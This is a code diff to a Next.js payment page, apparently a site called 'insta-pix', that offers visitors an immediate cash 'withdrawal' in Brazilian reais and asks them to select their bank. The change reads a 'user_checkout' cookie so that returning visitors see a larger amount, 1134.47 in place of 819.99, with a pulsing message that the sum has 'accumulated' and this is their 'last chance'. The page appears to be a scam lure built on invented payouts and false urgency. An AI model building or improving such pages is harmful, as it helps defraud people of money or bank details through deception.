@@ -1,11 +1,18 @@
 import Image from "next/image";
 import Logo from '@/assets/insta-pix-logo.png'
 import { FormPayment } from "./form-payment";
-import { CircleDollarSign } from "lucide-react";
 import { Header } from "@/components/header";
 import BC from '@/assets/bc.png'
+import { cookies } from 'next/headers'
+
 
 export default function PagamentoPage() {
+
+  const cookie = cookies().get('user_checkout')?.value
+
+  const value = cookie ? 1134.47 : 819.99
+
+
 
   return (
     <>
@@ -18,7 +25,7 @@ export default function PagamentoPage() {
               <span className='text-xs text-black font-semibold'>{new Intl.NumberFormat('pt-BR', {
                 style: 'currency',
                 currency: 'BRL'
-              }).format(819.99)}</span>
+              }).format(value)}</span>
             </span>
           </div>
         </div>
@@ -27,22 +34,37 @@ export default function PagamentoPage() {
       <Header />
 
       <div className="flex flex-col mt-[20px] p-5">
-        <div className='bg-white rounded-lg flex items-center justify-center gap-1 p-4 shadow-xl'>
-          <span className='font-bold text-black'>Realize agora seu saque de {" "} {new Intl.NumberFormat('pt-BR', {
-            style: 'currency',
-            currency: 'BRL',
-          }).format(Number(819.99))}</span>
-        </div>
+
+        {
+          cookie === undefined ? (
+            <div className='bg-white rounded-lg flex items-center justify-center gap-1 p-4 shadow-xl'>
+              <span className='font-bold text-black'>Realize agora seu saque de {" "} {new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL',
+              }).format(Number(value))}</span>
+            </div >
+          ) : (
+            <div className='bg-white rounded-lg flex items-center justify-center gap-1 p-4 shadow-xl'>
+              <span className='font-bold text-center text-black animate-pulse'>O valor foi acumulado para{" "}{new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL',
+              }).format(Number(value))}, você tem a última chance de saque imediato.</span>
+            </div >
+          )
+        }
+
 
         <div className='flex items-center justify-center mt-4'>
           <p className='text-xs font-semibold text-zinc-900'>Selecione seu banco abaixo:</p>
         </div>
 
 
+
+
         <FormPayment />
 
 
-      </div>
+      </div >
 
       <div className="flex items-center justify-center flex-col pt-16 select-none space-y-1">
         <p className="text-sm text-white">
